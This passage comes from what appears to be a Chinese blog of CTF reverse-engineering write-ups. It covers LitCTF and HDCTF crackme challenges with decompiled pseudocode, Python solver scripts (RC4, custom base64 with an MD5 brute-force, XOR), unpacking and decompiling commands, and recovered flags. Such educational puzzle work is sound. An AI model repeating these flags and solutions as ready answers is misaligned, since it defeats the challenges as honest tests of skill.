class="string">b&quot;litctf&quot;</span></span><br><span class="line">enc=ARC4.new(key)</span><br><span class="line">flag=enc.decrypt(vals_b)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="debase64"><a href="#debase64" class="headerlink" title="debase64"></a>debase64</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v4[<span class="number">4</span>]; <span class="comment">// [esp+10h] [ebp-44h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+20h] [ebp-34h]</span></span><br><span class="line">  __int16 v6; <span class="comment">// [esp+21h] [ebp-33h]</span></span><br><span class="line">  __int16 v7; <span class="comment">// [esp+23h] [ebp-31h]</span></span><br><span class="line">  __int16 v8; <span class="comment">// [esp+25h] [ebp-2Fh]</span></span><br><span class="line">  __int16 v9; <span class="comment">// [esp+27h] [ebp-2Dh]</span></span><br><span class="line">  __int16 v10; <span class="comment">// [esp+29h] [ebp-2Bh]</span></span><br><span class="line">  __int16 v11; <span class="comment">// [esp+2Bh] [ebp-29h]</span></span><br><span class="line">  __int16 v12; <span class="comment">// [esp+2Dh] [ebp-27h]</span></span><br><span class="line">  <span class="type">char</span> v13[<span class="number">20</span>]; <span class="comment">// [esp+3Ch] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">sub_402290</span>();</span><br><span class="line">  <span class="built_in">puts</span>(&amp;Buffer);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">15</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v13, <span class="number">0</span>, <span class="built_in">sizeof</span>(v13));</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v13);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v13) != <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_404053);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = <span class="number">70</span>;</span><br><span class="line">  v6 = <span class="number">6381</span>;</span><br><span class="line">  v7 = <span class="number">22166</span>;</span><br><span class="line">  v8 = <span class="number">-11618</span>;</span><br><span class="line">  v9 = <span class="number">-19854</span>;</span><br><span class="line">  v10 = <span class="number">-32589</span>;</span><br><span class="line">  v11 = <span class="number">-144</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">sub_401520</span>(v13, v4);</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="built_in">LOBYTE</span>(v4[<span class="number">0</span>])</span><br><span class="line">    || v6 != *(_WORD *)((<span class="type">char</span> *)v4 + <span class="number">1</span>)</span><br><span class="line">    || v7 != *(_WORD *)((<span class="type">char</span> *)v4 + <span class="number">3</span>)</span><br><span class="line">    || v8 != *(_WORD *)((<span class="type">char</span> *)&amp;v4[<span class="number">1</span>] + <span class="number">1</span>)</span><br><span class="line">    || v9 != *(_WORD *)((<span class="type">char</span> *)&amp;v4[<span class="number">1</span>] + <span class="number">3</span>)</span><br><span class="line">    || v10 != *(_WORD *)((<span class="type">char</span> *)&amp;v4[<span class="number">2</span>] + <span class="number">1</span>)</span><br><span class="line">    || v11 != *(_WORD *)((<span class="type">char</span> *)&amp;v4[<span class="number">2</span>] + <span class="number">3</span>)</span><br><span class="line">    || v12 != *(_WORD *)((<span class="type">char</span> *)&amp;v4[<span class="number">3</span>] + <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_40405E);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;byte_404065);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入 sub_401520</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">sub_401520</span><span class="params">(_BYTE *a1, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v2; <span class="comment">// ebp</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// edx</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// ecx</span></span><br><span class="line">  _BYTE *v9; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+0h] [ebp-38h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+4h] [ebp-34h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+Ch] [ebp-2Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !*a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v2 = a1 + <span class="number">4</span>;</span><br><span class="line">  v3 = a1;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">64</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( byte_404000[i] != *v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( ++i == <span class="number">64</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">LOBYTE</span>(v14) = i;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_7:</span><br><span class="line">    <span class="built_in">LOBYTE</span>(i) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( byte_404000[i] != a1[v4 + <span class="number">1</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( ++i == <span class="number">64</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">BYTE1</span>(v14) = i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( i != <span class="number">64</span> );</span><br><span class="line">LABEL_11:</span><br><span class="line">    v7 = &amp;a1[v4 + <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j != <span class="number">64</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( byte_404000[j] != *v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( ++j == <span class="number">64</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">BYTE2</span>(v14) = j;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_15:</span><br><span class="line">    v9 = &amp;a1[v4 + <span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k != <span class="number">64</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( byte_404000[k] != *v9 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( ++k == <span class="number">64</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">HIBYTE</span>(v14) = k;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_19:</span><br><span class="line">    v12 = v5 + <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(a2 + v5) = (<span class="number">4</span> * <span class="built_in">HIBYTE</span>(v14)) | (<span class="built_in">BYTE2</span>(v14) &gt;&gt; <span class="number">4</span>) &amp; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v7 == <span class="number">61</span> )</span><br><span class="line">      <span class="keyword">return</span> v12;</span><br><span class="line">    v12 = v5 + <span class="number">2</span>;</span><br><span class="line">    *(_BYTE *)(a2 + v5 + <span class="number">1</span>) = (<span class="number">16</span> * <span class="built_in">BYTE2</span>(v14)) | (<span class="built_in">BYTE1</span>(v14) &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v9 == <span class="number">61</span> )</span><br><span class="line">      <span class="keyword">return</span> v12;</span><br><span class="line">    v5 += <span class="number">3</span>;</span><br><span class="line">    v3 = v2;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">    v13 += <span class="number">4</span>;</span><br><span class="line">    v4 = v13;</span><br><span class="line">    *(_BYTE *)(a2 + v5 - <span class="number">1</span>) = (<span class="built_in">BYTE1</span>(v14) &lt;&lt; <span class="number">6</span>) | v14 &amp; <span class="number">0x3F</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !*(v2 - <span class="number">4</span>) )</span><br><span class="line">      <span class="keyword">return</span> v5;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个类似base64的算法，将输入的20个字符分为4组每组分别反序做base64运算，这里字符会与v4作比较，直接在sub_401520处设个断点进入就能看到v4的值了</p><p><img src="/2023/05/16/LitCTF%E5%A4%8D%E7%8E%B0/2.png"></p><p>但是拿到的字符会有一位不知道，因为题目给了最后的md5值，直接爆破就好，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">val=[<span class="number">0x46</span>,<span class="number">0xED</span>,<span class="number">0X18</span>,<span class="number">0X96</span>,<span class="number">0X56</span>,<span class="number">0X9E</span>,<span class="number">0XD2</span>,<span class="number">0X72</span>,<span class="number">0XB2</span>,<span class="number">0XB3</span>,<span class="number">0X80</span>,<span class="number">0X70</span>,<span class="number">0XFF</span>]</span><br><span class="line">val_b=<span class="built_in">bytes</span>(val)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(val_b))<span class="comment">#Ru0Yllae0nKys4Bw/w==   --&gt; Y0uReallyKn0wB4s?===</span></span><br><span class="line"></span><br><span class="line">key=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    flag=<span class="string">&quot;Y0uReallyKn0wB4s&quot;</span>+i+<span class="string">&quot;===&quot;</span></span><br><span class="line">    <span class="keyword">if</span> hashlib.md5(flag.encode()).hexdigest()==<span class="string">&quot;5a3ebb487ad0046e52db00570339aace&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>知道了ARC4加密方式的处理，知道了magic number。</p>]]></content>
      
      
      <categories>
          
          <category> reserve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赛事复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HDCTF复现</title>
      <link href="/2023/04/24/HDCTF%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/04/24/HDCTF%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="HDCTF-reverse部分复现"><a href="#HDCTF-reverse部分复现" class="headerlink" title="HDCTF reverse部分复现"></a>HDCTF reverse部分复现</h1><h2 id="easy-re"><a href="#easy-re" class="headerlink" title="easy_re"></a>easy_re</h2><h3 id="首先查壳"><a href="#首先查壳" class="headerlink" title="首先查壳"></a>首先查壳</h3><p>是UPX壳，扔进虚拟机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx -d 文件名</span><br></pre></td></tr></table></figure><p>直接脱壳</p><h3 id="扔进ida"><a href="#扔进ida" class="headerlink" title="扔进ida"></a>扔进ida</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  <span class="built_in">func</span>(a, encode_a);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">32</span>; ++i )</span><br><span class="line">    <span class="built_in">f3</span>(s);</span><br><span class="line">  <span class="built_in">func</span>(s, encode_s);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(encode_s, a) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congratulations! You get the flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Sorry,try again&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没什么好说的，逻辑很简单，s就是flag，s的加密就是a，而a是字符串“SERDVEZ7WTB1X2hAdjJfL1wvXEA1N2VyM2RfN2hlX3IzdjNyczN9”，跟进func加密函数，可以分析到这是一个base64加密，直接把a拿去base64解密就行。</p><p>HDCTF{Y0u_h@v2_&#x2F;/@57er3d_7he_r3v3rs3}</p><h2 id="easy-arm"><a href="#easy-arm" class="headerlink" title="easy_arm"></a>easy_arm</h2><h3 id="直接扔进ida"><a href="#直接扔进ida" class="headerlink" title="直接扔进ida"></a>直接扔进ida</h3><p>打开代码，分析代码，发现主要就做了两件事，输入字符串然后将字符串与0x10进行亦或操作，字符串也很好找，因为只有一串有效的字符串，那么就直接上脚本吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">val=[<span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0x74</span>, <span class="number">0x20</span>, <span class="number">0x65</span>, <span class="number">0x71</span>, <span class="number">0x75</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x21</span>,</span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x45</span>, <span class="number">0x71</span>, <span class="number">0x75</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x21</span>, <span class="number">0x24</span>, <span class="number">0x58</span>, <span class="number">0x54</span>,</span><br><span class="line">  <span class="number">0x53</span>, <span class="number">0x44</span>, <span class="number">0x56</span>, <span class="number">0x6B</span>, <span class="number">0x5A</span>, <span class="number">0x65</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x4F</span>, <span class="number">0x71</span>,</span><br><span class="line">  <span class="number">0x4F</span>, <span class="number">0x75</span>, <span class="number">0x23</span>, <span class="number">0x63</span>, <span class="number">0x69</span>, <span class="number">0x4F</span>, <span class="number">0x71</span>, <span class="number">0x43</span>, <span class="number">0x7D</span>, <span class="number">0x6D</span>,</span><br><span class="line">  <span class="number">0x24</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> val:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)<span class="comment">#Not equal!$Equal!$XTSDVkZecdOqOu#ciOqC&#125;m$</span></span><br><span class="line"></span><br><span class="line">realval=<span class="string">&#x27;XTSDVkZecdOqOu#ciOqC&#125;m&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> realval:</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)^<span class="number">0x10</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="double-code"><a href="#double-code" class="headerlink" title="double_code"></a>double_code</h2><p>shellcode类题目，也是第一次见，还是要先去了解一下什么是shellcode，实际上就是跑病毒的代码，这里也是先借鉴一下大佬的wp，补一补shellcode的姿势。</p><p>先进入函数sub_14001F000,这个函数就是加载shellcode的代码，这里提示了“WriteProcessMemory:%d\n”，说明是写入了病毒的，打开后这里就可以用opcode去做了。这里可以看出v7 v9 v11 v13是flag的四部分，其实v0或v1就是外部所给数据，那么就可以根据这段伪代码得到脚本，只需将数据根据每部分逻辑逆向即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">val=[<span class="number">0x48</span>,<span class="number">0x67</span>,<span class="number">0x45</span>,<span class="number">0x51</span>,<span class="number">0x42</span>,<span class="number">0x7b</span>,<span class="number">0x70</span>,<span class="number">0x6a</span>,<span class="number">0x30</span>,<span class="number">0x68</span>,<span class="number">0x6c</span>,<span class="number">0x60</span>,<span class="number">0x32</span>,<span class="number">0x61</span>,<span class="number">0x61</span>,<span class="number">0x5f</span>,<span class="number">0x42</span>,<span class="number">0x70</span>,<span class="number">0x61</span>,<span class="number">0x5b</span>,<span class="number">0x30</span>,<span class="number">0x53</span>,<span class="number">0x65</span>,<span class="number">0x6c</span>,<span class="number">0x60</span>,<span class="number">0x65</span>,<span class="number">0x7c</span>,<span class="number">0x63</span>,<span class="number">0x69</span>,<span class="number">0x2d</span>,<span class="number">0x5f</span>,<span class="number">0x46</span>,<span class="number">0x35</span>,<span class="number">0x70</span>,<span class="number">0x75</span>,<span class="number">0x7d</span>]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(val)):</span><br><span class="line">    key=i%<span class="number">5</span></span><br><span class="line">    <span class="keyword">if</span> key==<span class="number">1</span>:</span><br><span class="line">        flag+=<span class="built_in">chr</span>(val[i]^<span class="number">0x23</span>)</span><br><span class="line">    <span class="keyword">elif</span> key==<span class="number">2</span>:</span><br><span class="line">        flag+=<span class="built_in">chr</span>(val[i]-<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">elif</span> key==<span class="number">3</span>:</span><br><span class="line">        flag+=<span class="built_in">chr</span>(val[i]+<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">elif</span> key==<span class="number">4</span>:</span><br><span class="line">        flag+=<span class="built_in">chr</span>(val[i]+<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">elif</span> key==<span class="number">5</span>:</span><br><span class="line">        flag+=<span class="built_in">chr</span>(val[i]+<span class="number">25</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag+=<span class="built_in">chr</span>(val[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="fake-game"><a href="#fake-game" class="headerlink" title="fake_game"></a>fake_game</h2><p>以前没做到过python打包的程序，所以看了一下做python打包程序的步骤，首先把程序用pyinstxtractor解包，具体步骤就是将要解包的程序放在pyinstxtractor文件根目录下，然后在根目录下打开终端，运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\pyinstxtractor.py 文件名.类型</span><br></pre></td></tr></table></figure><p>然后会在根目录下生成一个文件夹，在文件夹中我们可以找到解包好的文件名.pyc文件，然后将得到的pyc文件反编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6.exe ./文件名.pyc &gt; 生成文件名.py</span><br></pre></td></tr></table></figure><p>打开得到的py文件，找到了关键的flag字眼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">start_game</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">global</span> GAMEOVER</span><br><span class="line">    xorr = [</span><br><span class="line">     <span class="number">0</span>] * <span class="number">4</span></span><br><span class="line">    ans = [<span class="number">0</span>] * <span class="number">55</span></span><br><span class="line">    flag = [<span class="number">178868</span>, <span class="number">188</span>, <span class="number">56953</span>, <span class="number">2413</span>, <span class="number">178874</span>, <span class="number">131</span>, <span class="number">56957</span>, <span class="number">2313</span>, <span class="number">178867</span>, <span class="number">156</span>, </span><br><span class="line">     <span class="number">56933</span>, <span class="number">2377</span>, <span class="number">178832</span>, <span class="number">202</span>, <span class="number">56899</span>, <span class="number">2314</span>, <span class="number">178830</span>, <span class="number">167</span>, <span class="number">56924</span>, </span><br><span class="line">     <span class="number">2313</span>, <span class="number">178830</span>, <span class="number">167</span>, <span class="number">56938</span>, <span class="number">2383</span>, <span class="number">178822</span>, <span class="number">217</span>, <span class="number">56859</span>, <span class="number">2372</span>]</span><br><span class="line">    self.init_window()</span><br><span class="line">    self.init_plant_points()</span><br><span class="line">    self.init_map()</span><br><span class="line">    self.init_zombies()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> GAMEOVER:</span><br><span class="line">        MainGame.window.fill((<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">        MainGame.window.blit(self.draw_text(<span class="string">&#x27;当前钱数$: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(MainGame.money), <span class="number">26</span>, (<span class="number">255</span>,</span><br><span class="line">                                                                                     <span class="number">0</span>,</span><br><span class="line">                                                                                     <span class="number">0</span>)), (<span class="number">500</span>,</span><br><span class="line">                                                                                           <span class="number">40</span>))</span><br><span class="line">        MainGame.window.blit(self.draw_text(<span class="string">&#x27;当前关数&#123;&#125;，得分&#123;&#125;,距离下关还差&#123;&#125;分&#x27;</span>.<span class="built_in">format</span>(MainGame.shaoguan, MainGame.score, MainGame.remnant_score), <span class="number">26</span>, (<span class="number">255</span>,</span><br><span class="line">                                                                                                                                            <span class="number">0</span>,</span><br><span class="line">                                                                                                                                            <span class="number">0</span>)), (<span class="number">5</span>,</span><br><span class="line">                                                                                                                                                  <span class="number">40</span>))</span><br><span class="line">        self.load_help_text()</span><br><span class="line">        xorr[<span class="number">0</span>] = MainGame.money</span><br><span class="line">        xorr[<span class="number">1</span>] = MainGame.shaoguan</span><br><span class="line">        xorr[<span class="number">2</span>] = MainGame.score</span><br><span class="line">        xorr[<span class="number">3</span>] = MainGame.remnant_score</span><br><span class="line">        <span class="keyword">if</span> xorr[<span class="number">0</span>] * <span class="number">256</span> - xorr[<span class="number">1</span>] / <span class="number">2</span> + xorr[<span class="number">2</span>] * <span class="number">23</span> + xorr[<span class="number">3</span>] / <span class="number">2</span> == <span class="number">47118166</span>:</span><br><span class="line">            <span class="keyword">if</span> xorr[<span class="number">0</span>] * <span class="number">252</span> - xorr[<span class="number">1</span>] * <span class="number">366</span> + xorr[<span class="number">2</span>] * <span class="number">23</span> + xorr[<span class="number">3</span>] / <span class="number">2</span> - <span class="number">1987</span> == <span class="number">46309775</span>:</span><br><span class="line">                <span class="keyword">if</span> xorr[<span class="number">0</span>] * <span class="number">6</span> - xorr[<span class="number">1</span>] * <span class="number">88</span> + xorr[<span class="number">2</span>] / <span class="number">2</span> + xorr[<span class="number">3</span>] / <span class="number">2</span> - <span class="number">11444</span> == <span class="number">1069997</span>:</span><br><span class="line">                    